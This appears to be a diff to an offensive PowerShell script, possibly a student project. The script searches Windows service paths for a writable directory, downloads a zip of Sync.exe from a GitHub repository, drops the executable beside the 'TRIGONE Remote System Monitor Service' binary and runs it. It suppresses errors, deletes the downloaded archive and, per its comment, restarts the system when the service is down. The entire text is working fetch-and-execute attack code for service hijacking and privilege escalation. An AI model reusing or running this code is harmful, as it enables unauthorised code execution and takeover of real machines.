@@ -13,7 +13,7 @@ ForEach ($svc in $svclist) {
 
 # Traverse and identify writable directory
 foreach ($path in $servicePaths) {
-    $url = "https://github.com/prince-spooler/FYP/blob/main/Sync.exe"
+    $url = "https://github.com/prince-spooler/FYP/raw/main/Sync.zip"
 
     $parentDir = Split-Path -Path $path -Parent
     $dirName = ($path -split "\\")[-2]
@@ -28,8 +28,17 @@ foreach ($path in $servicePaths) {
                 Write-Host "Found writable directory: $parentParentDir"
                 Set-Location $parentParentDir
                 $words = $dirName -split "\s+"
-                $fileName = $words[0] + ".exe"
-                cmd.exe /c "certutil -urlcache -split -f $url $fileName" ; .\$fileName
+                $folderName = $words[0]
+                $zipPath = Join-Path -Path $parentParentDir -ChildPath "$folderName.zip"
+                $extractPath = Join-Path -Path $parentParentDir -ChildPath $folderName
+                Invoke-WebRequest $url -OutFile $zipPath -ErrorAction SilentlyContinue
+                Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force -ErrorAction SilentlyContinue
+                $exePath = Join-Path -Path $extractPath -ChildPath "Sync.exe"
+                Copy-Item -Path $exePath -Destination $parentParentDir -Force -ErrorAction SilentlyContinue
+                Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
+                Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue
+                $fileName = Join-Path -Path $parentParentDir -ChildPath "Sync.exe"
+                & $fileName
                 # If the service is not running, restart the system
                 $svcStatus = Get-Service -DisplayName "TRIGONE Remote System Monitor Service" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Status
                 if ($svcStatus -ne "Running") {
